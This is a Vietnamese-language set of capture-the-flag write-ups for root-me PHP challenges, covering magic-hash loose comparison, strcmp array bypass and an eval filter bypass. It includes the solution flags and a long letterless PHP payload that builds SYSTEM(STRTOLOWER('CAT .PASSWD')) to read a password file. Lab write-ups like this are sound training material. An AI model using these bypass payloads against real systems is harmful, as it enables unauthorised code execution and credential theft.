# root-me & websec write-ups

## Index

[PHP - Loose Comparison]()

[PHP - type juggling]()

[]()

### PHP - Loose Comparison 

![image](https://user-images.githubusercontent.com/80137840/220050522-8d525795-0345-401c-b416-f0b237f87296.png)

Truy cập challenge, ta thấy có 2 ô input **seed** **hash** cùng [source code](http://challenge01.root-me.org/web-serveur/ch55/index.php?source)

![image](https://user-images.githubusercontent.com/80137840/220052042-affc660e-b1dc-4718-839e-37b70efa01c2.png)

```
<html>
<body>
 <form action="index.php" class="authform" method="post" accept-charset="utf-8">
        <fieldset>
            <legend>Unbreakable Random</legend>
            <input type="text" id="s" name="s" value="" placeholder="seed" />
            <input type="text" id="h" name="h" value="" placeholder="hash" />
            <input type="submit" name="submit" value="Check" />

        <div class="return-value" style="padding: 10px 0">&nbsp;</div>
        </fieldset>
        </form>
<?php
function gen_secured_random() { // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;

    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;

    return $a+$b;
}

function secured_hash_function($plain) { // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}

function sanitize_user_input($input) { // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, "", $input);
    return $secured_input;
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}


require_once "secret.php";

if (isset($_POST['s']) && isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if($s != false && $h != false) {
        if($s.$r == $h) {
            print "Well done! Here is your flag: ".$flag;
        }
        else {
            print "Fail...";
        }
    }
    else {
        print "<p>Hum ...</p>";
    }
}
?>
<p><em><a href="index.php?source">source code</a></em></p>
</body>
</html>
```

Trang web yêu cầu nhập vào 2 chuỗi **seed**, **hash** và so sánh nếu giá trị hash md5 bằng (==) với chuỗi seed nối thêm với 1 số ngẫu nhiên thì in ra flag. Ngoài ra trang web cũng filter các ký tự đặc biệt khác chữ và số.

Lỗi trong bài này ở chỗ kiểm tra điều kiện bằng để in ra flag chỉ là điều kiện loose(==) chứ không phải strict(===). Lỗi này được gọi là PHP Juggling type nên ở đây ta có 1 số phép so sánh đặc biệt:

```
Nếu giá trị hàm băm được bắt đầu bằng "0e" (hoặc "0..0e") và theo sau chỉ là các số nguyên, thì PHP sẽ coi hàm băm là một số thực (= 0 * 10^n = 0)
Một số trường hợp cụ thể: 
md5('240610708') == md5('QNKCDZO')
md5('aabg7XSs') == md5('aabC9RqS')
MD5('240610708') = 0e462097431906509019562988736854
MD5('QNKCDZO') = 0e830400451993494058024219903391
MD5('0e113712690') = 0e291659922323405260514745084877
MD5('0e215962017') = 0e291242476940776845150308577824
```

(Reference: [Type Juggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling))

Vì chuỗi **seed** được nối cùng với 1 số ngẫu nhiên nên ta chỉ cần điền vào giá trị `0e` và điền chuỗi **hash** là `QNKCDZO` thì sau khi MD5('QNKCDZO'), phép so sánh này `if($s.$r == $h)` sẽ trả về **true** và print flag.

![image](https://user-images.githubusercontent.com/80137840/220073021-5995f432-bbc9-4790-b27f-b38b42a509d7.png)

Submit flag: `F34R_Th3_L0o5e_C0mP4r15On`

![image](https://user-images.githubusercontent.com/80137840/220073315-00b87905-f2ee-46bd-ade5-c6e3ea496c28.png)


## PHP - type juggling

![image](https://user-images.githubusercontent.com/80137840/220074414-7327c57a-a16d-4674-b06d-9c8db4d73a91.png)

Truy cập challenge, ta thấy có 2 ô input **login** **password** cùng [source code](http://challenge01.root-me.org/web-serveur/ch44/auth.php?source)

![image](https://user-images.githubusercontent.com/80137840/220074801-308106e0-6668-4204-b815-86f816340e70.png)

```
<?php

// $FLAG, $USER and $PASSWORD_SHA256 in secret file
require("secret.php");

// show my source code
if(isset($_GET['source'])){
    show_source(__FILE__);
    die();
}

$return['status'] = 'Authentication failed!';
if (isset($_POST["auth"]))  { 
    // retrieve JSON data
    $auth = @json_decode($_POST['auth'], true);
    
    // check login and password (sha256)
    if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
        $return['status'] = "Access granted! The validation password is: $FLAG";
    }
}
print json_encode($return);
```

Trang web yêu cầu nhập vào 2 chuỗi **login** và **password**, sau đó hash SHA-256 **password** rồi gửi lên server dưới dạng JSON 

![image](https://user-images.githubusercontent.com/80137840/220076332-0d4bc802-bf7e-4c91-8a90-584e913edf2f.png)

Bên server kiểm tra nếu chuỗi **login** có giá trị bằng(==) với biến $USER và **password** so sánh giống với giá trị biến $PASSWORD_SHA256 thì Access granted! và in ra flag.

Lỗi trong bài này ở chỗ kiểm tra điều kiện chuỗi **login** bằng với biến $USER chỉ là điều kiện loose(==) chứ không phải strict(===) và chuỗi **password** không được validate dữ liệu nên ta có thể sử dụng một số trick so sánh đặc biệt như sau:

```
Khi so sánh loose một chuỗi với một số, PHP sẽ cố gắng chuyển đổi chuỗi thành một số sau đó thực hiện phép so sánh. Số nguyên sau khi chuyển đổi là giá trị các số kể từ vị trí đầu cho đến khi gặp ký tự chữ cái đầu tiên (nếu không có số nào thì giá trị == 0). Một số ví dụ:
'abc' == 0
'1abc' == 1
'123' == 123
'123abc' == 123
'' == 0 == false == NULL

Nếu một mảng được truyền vào 1 đối số của hàm strcmp() thì giá trị NULL được trả về, do đó !strcmp() lúc này sẽ trả về 1. Một số ví dụ:
strcmp([], "abcxyz") === NULL => strcmp([], "abcxyz") == 0
strcmp(array(), "abcxyz") === NULL => strcmp(array(), "abcxyz") == 0
strcmp(['abc'], "abcxyz") === NULL => strcmp(['abc'], "abcxyz") == 0
```

Như vậy ta chỉ cần điền **password** bằng 1 array là bypass được phép kiểm tra `!strcmp($auth['data']['password'], $PASSWORD_SHA256)`. Tuy nhiên **password** được hash trước khi gửi lên server nên ta sẽ chỉnh sửa trong Burpsuite. Với biến $USER, ta dự đoán biến này nhận ký tự chữ cái đầu tiên nên ta điền giá trị **password** bằng 0.

![image](https://user-images.githubusercontent.com/80137840/220086606-cc71800e-8f1d-4783-9396-d6ef1f01e9a3.png)

Nhận được response Access granted! Submit flag: `DontForgetPHPL00seComp4r1s0n`

![image](https://user-images.githubusercontent.com/80137840/220086814-c53c0bf7-a312-4e63-bdfc-b8fab58ccd92.png)


## PHP - Eval

![image](https://user-images.githubusercontent.com/80137840/220087758-75edc82f-09bb-4149-a659-ddb7b8e27acf.png)

Ta cần lấy flag trong file .passwd. Đề bài cho source code:

```
<html>
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>
```

Trang web của challenge:

![image](https://user-images.githubusercontent.com/80137840/220134536-5e7a2a2b-9723-4007-bdae-8758cc9caba4.png)

Trang yêu cầu ta nhập vào 1 chuỗi **input** và server thực thi chuỗi này thông qua hàm eval(). Hàm này thực thi đoạn mã PHP bên trong và phải kết thúc bằng dấu chấm phẩy. Vậy thì ta chỉ cần nhập webshell `system('cat .passwd')` là có thể lấy được flag. Tuy nhiên bài không đơn giản như vậy, server chỉ thực thi đến hàm eval() nếu như chuỗi **input** nhập vào không có bất kỳ ký tự chữ cái và ký tự backtick nào. Hmm...phải làm sao bây giờ...

Thử search google, ta tìm thấy 1 trang web khá hữu ích cho việc viết webshell cho bài này 
> https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/

Ta sẽ sử dụng những ký tự `'$' '_' '.' '+'` thay cho chữ cái để tạo thành một command shell để thực thi. Giả sử $_ = 'a' thì $_++ sẽ là 'b',... cứ cộng dần lên ký tự mà ta muốn rồi sau đó ghép nó lại.

Trong PHP, nếu ta muốn nối mảng và chuỗi thì mảng sẽ được chuyển thành chuỗi có giá trị là `Array`

![image](https://user-images.githubusercontent.com/80137840/220143975-a5df3a04-091a-45b0-a80f-9564d5cd9c96.png)

Và sau đó lấy chữ cái đầu tiên của chuỗi, ta có thể nhận được ký tự 'A'.

Mục đích cuối cùng của ta là tạo được chuỗi `system('cat .passwd')` vào **input**. Tuy nhiên tên hàm không phân biệt hoa thường nhưng command shell thì có, mà ký tự đầu tiên ta nhận được là 'A' nên ta sẽ xây dựng thêm hàm STRLOWER() bên ngoài để lowercase nội dung command shell.

Tiến hành xây dựng chuỗi `SYSTEM(STRLOWER('CAT .PASSWD'))`:

```
$_=[];
$_ = @"$_";  // $_ = "Array" (@ là toán tử kiểm soát lỗi, bất cứ khi nào nó được sử dụng với một biểu thức, bất kỳ thông báo lỗi nào có thể được tạo ra bởi biểu thức đó sẽ bị bỏ qua)
$_ = $_['!'=='@'];  // $_ = $_[0] = 'A' do bool('!'=='@') = false mà false == 0
$___ = $_;  // $___ = 'A'
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'S'
$___ = $__;  // $___ = 'S'
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'Y'
$___ .= $__;  // $___ = "SY"
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'S'
$___ .= $__;  // $___ = "SYS"
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'T'
$___ .= $__;  // $___ = "SYST"
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;  // $__ = 'E'
$___ .= $__;  // $___ = "SYSTE"
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'M'
$___ .= $__;  // $___ = "SYSTEM"
$__ = $_;  // $__ = 'A'

$_____ = '';
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'S'
$_____ .= $__;  // $_____ = 'S'
$__ = $_;  // $__ = 'A'
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'T'
$_____ .= $__;  // $_____ = "ST"
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'R'
$_____ .= $__;  // $_____ = "STR"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'T'
$_____ .= $__;  // $_____ = "STRT"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'O'
$_____ .= $__;  // $_____ = "STRTO"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'L'
$_____ .= $__;  // $_____ = "STRTOL"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'O'
$_____ .= $__;  // $_____ = "STRTOLO"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'W'
$_____ .= $__;  // $_____ = "STRTOLOW"
$__=$_;
++$__;++$__;++$__;++$__;  // $__ = 'E'
$_____ .= $__;  // $_____ = "STRTOLOWE"
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'R'
$_____ .= $__;  // $_____ = "STRTOLOWER"
$__ = $_;

$____ = ''; 
++$__;++$__;  // $__ = 'C'
$____ .= $__;  // $____ = 'C'
$__ = $_;
$____ .= $__;  // $____ = "CA"
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'T'
$____ .= $__;  // $____ = "CAT"
$__ = $_;

$______ = '.';
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'P'
$______ .= $__;  // $______ = ".P"
$__ = $_;
$______ .= $__;  // $______ = ".PA"
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'S'
$______ .= $__;  // $______ = ".PAS"
$______ .= $__;  // $______ = ".PASS"
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;  // $__ = 'W'
$______ .= $__;  // $______ = ".PASSW"
$__ = $_;
++$__;++$__;++$__;  
$______ .= $__;  // $______ = ".PASSWD"
$__ = $_;
$__________ = $____." ".$______ ;  // $__________ = "CAT"." ".".PASSWD" = "CAT .PASSWD"
$___($_____($__________))  // SYSTEM(STRTOLOWER("CAT .PASSWD")) 
```

Copy chuỗi payload này vào param trong Burp, trước khi send cần xóa hết comment và URLencode payload

![image](https://user-images.githubusercontent.com/80137840/220170417-fef2b5e4-0256-4da1-974f-6efd82853820.png)

Cuối cùng cũng nhận được flag. Submit flag: `M!xIng_PHP_w1th_3v4l_L0L`

![image](https://user-images.githubusercontent.com/80137840/220170794-24d1811f-2f2e-4f58-8c72-944910258d03.png)


### Level Seventeen - websec

![image](https://user-images.githubusercontent.com/80137840/220172384-6917bdbd-06ab-4276-a4da-e86e3f6e4615.png)




